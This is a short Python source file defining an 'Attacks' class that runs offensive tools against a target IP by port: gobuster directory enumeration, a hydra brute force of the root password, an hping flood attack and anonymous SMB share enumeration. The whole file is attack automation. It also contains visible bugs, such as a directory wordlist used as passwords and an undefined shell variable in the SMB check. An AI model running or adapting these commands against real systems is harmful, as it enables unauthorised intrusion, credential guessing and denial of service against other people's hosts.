import os

class Attacks:
    def gobuster(ip, port):
        print("Trying enumerate directories")
        result = os.popen("timeout 10s gobuster dir -w ./wordlists/directory-list-2.3-medium.txt -u http://{0}:{1} -t 100".format(ip, port)).read()
        return result
    def hydra(ip, port=None):
        _tr = 4 if port == 22 else 100
        result = os.popen("timeout 10s hydra -v -I -l root -P wordlists/directory-list-2.3-medium.txt -t {2} $(getent services {0} | awk \'{{print $1}}\')://{1}".format(port, ip, _tr)).read()
        print(result)
    def hping(ip, port=None):
        result = os.popen("timeout 10s hping --flood --destport {1} {0}".format(ip, port)).read()
    def smb_enum(ip, port=None):
        print("Testing SMB enumeration")
        result = os.popen("if [[ \"$(smbclient -L //{0} -U Пользователь --no-pass | awk \'{{ print $1 }}\')\" != \"session\" && \"$(smbclient -L //$i -U Пользователь --no-pass | awk \'{{ print $1 }}\')\" != \"do_connect\" ]]; then echo \"True\"; else echo \"False\"; fi".format(ip)).read()
        print(result)
    
    _KNOWN_ATTACK_METHODS = {"80" : [gobuster, hping],
                             "8080": [gobuster, hping],
                             "445": [smb_enum],
                             "21": [hydra],
                             "22": [hydra, hping]}
    